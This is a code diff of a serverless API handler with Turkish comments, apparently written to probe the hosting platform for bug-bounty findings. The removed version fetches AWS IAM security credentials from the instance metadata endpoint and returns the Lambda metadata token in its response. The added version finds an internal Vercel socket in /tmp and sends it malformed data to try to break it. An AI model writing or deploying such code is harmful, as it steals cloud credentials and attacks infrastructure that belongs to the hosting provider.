@@ -1,22 +1,46 @@
-export default async function handler(req, res) {
-  const sonuclar = {};
-  
-  try {
-    // 1. AWS Metadata Kapısını Zorla (En Büyük Ödül Buradan Gelir)
-    const awsCreds = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', { timeout: 1000 })
-      .then(r => r.text()).catch(() => "Erişim Yok");
-    
-    // 2. 9001 Portundan "Identity" Bilgisi Çek
-    const identity = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`)
-      .then(r => Object.fromEntries(r.headers)).catch(() => "Hata");
+import fs from 'fs';
+import net from 'net';
 
-    res.status(200).json({
-      durum: "Altyapı Analizi",
-      aws_iam_role: awsCreds, // Eğer burada bir isim çıkarsa P1/P2 garanti!
-      lambda_identity: identity['lambda-runtime-invoked-function-arn'],
-      env_token: process.env.AWS_LAMBDA_METADATA_TOKEN
-    });
-  } catch (e) {
-    res.status(200).json({ hata: e.message });
+export default async function handler(req, res) {
+  const tmpFiles = fs.readdirSync('/tmp');
+  const socketPath = tmpFiles.find(f => f.startsWith('vercel-') && f.endsWith('.sock'));
+  
+  if (!socketPath) {
+    return res.status(200).json({ hata: "Soket dosyası bulunamadı. Vercel hattı gizlemiş olabilir." });
   }
+
+  const fullPath = `/tmp/${socketPath}`;
+  let report = [];
+
+  // Sokete bağlanıp "Anlamsız/Bozuk" veri gönderiyoruz (Fuzzing)
+  const probeSocket = () => {
+    return new Promise((resolve) => {
+      const client = net.createConnection(fullPath);
+      
+      client.on('connect', () => {
+        // Vercel'in beklemediği devasa veya bozuk bir JSON gönderiyoruz
+        const malformedData = Buffer.alloc(1024 * 5, 'A'); // 5KB'lık 'A' harfi
+        client.write(malformedData);
+        report.push("Bağlantı kuruldu, bozuk veri gönderildi.");
+        client.destroy();
+      });
+
+      client.on('error', (err) => {
+        report.push(`Hata yakalandı: ${err.message}`);
+        resolve();
+      });
+
+      client.on('close', () => resolve());
+      setTimeout(() => resolve(), 1000); // 1 saniye sonra pes et
+    });
+  };
+
+  await probeSocket();
+
+  res.status(200).json({
+    hedef_soket: fullPath,
+    aksiyon: "Socket Manipulation Attempted",
+    sonuc_raporu: report,
+    sistem_notu: "Eğer hata mesajında 'EACCES' (Erişim Engellendi) dışında bir şey görürsek, hattı bozmuşuz demektir."
+  });
 }
